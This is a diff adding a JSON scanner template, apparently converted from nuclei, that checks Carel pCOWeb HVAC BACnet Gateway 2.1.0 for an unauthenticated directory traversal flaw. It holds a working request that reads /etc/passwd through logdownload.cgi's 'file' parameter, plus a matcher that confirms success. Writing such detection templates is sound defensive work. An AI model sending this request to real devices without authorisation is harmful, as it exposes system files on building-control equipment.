@@ -1,0 +1,129 @@
+{
+  "id": "carel-bacnet-gateway-traversal",
+  "name": "Carel pCOWeb HVAC BACnet Gateway 2.1.0 - Local File Inclusion",
+  "author": "gy741",
+  "severity": "HIGH",
+  "description": "Carel pCOWeb HVAC BACnet Gateway 2.1.0 is vulnerable to local file inclusion because of input passed through the \u0027file\u0027 GET parameter through the \u0027logdownload.cgi\u0027 Bash script is not properly verified before being used to download log files. This can be exploited to disclose the contents of arbitrary and sensitive files via directory traversal attacks.",
+  "references": [
+    "https://www.zeroscience.mk/codes/carelpco_dir.txt",
+    "https://thecyberpost.com/tools/exploits-cve/carel-pcoweb-hvac-bacnet-gateway-2-1-0-unauthenticated-directory-traversal/"
+  ],
+  "tags": [
+    "carel",
+    "lfi",
+    "traversal",
+    "unauth",
+    "bacnet"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {},
+  "variables": {},
+  "variablesType": "sniper",
+  "cweId": "CWE-22",
+  "cvssScore": "7.5",
+  "cvssMetrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}/usr-cgi/logdownload.cgi?file\u003d../../../../../../../../etc/passwd",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "REGEX",
+          "part": "body",
+          "values": [
+            "root:.*:0:0:"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "internal": "true",
+          "group": 1
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "carel-bacnet-gateway-traversal",
+    "info": {
+      "name": "Carel pCOWeb HVAC BACnet Gateway 2.1.0 - Local File Inclusion",
+      "author": "gy741",
+      "severity": "high",
+      "description": "Carel pCOWeb HVAC BACnet Gateway 2.1.0 is vulnerable to local file inclusion because of input passed through the \u0027file\u0027 GET parameter through the \u0027logdownload.cgi\u0027 Bash script is not properly verified before being used to download log files. This can be exploited to disclose the contents of arbitrary and sensitive files via directory traversal attacks.",
+      "reference": [
+        "https://www.zeroscience.mk/codes/carelpco_dir.txt",
+        "https://thecyberpost.com/tools/exploits-cve/carel-pcoweb-hvac-bacnet-gateway-2-1-0-unauthenticated-directory-traversal/"
+      ],
+      "classification": {
+        "cvss_metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+        "cvss_score": "7.5",
+        "cwe_id": "CWE-22"
+      },
+      "metadata": {
+        "max_request": 1
+      },
+      "tags": "carel,lfi,traversal,unauth,bacnet"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}/usr-cgi/logdownload.cgi?file\u003d../../../../../../../../etc/passwd"
+        ],
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers": [
+          {
+            "type": "regex",
+            "part": "body",
+            "regex": [
+              "root:.*:0:0:"
+            ],
+            "group": 1,
+            "internal": true
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
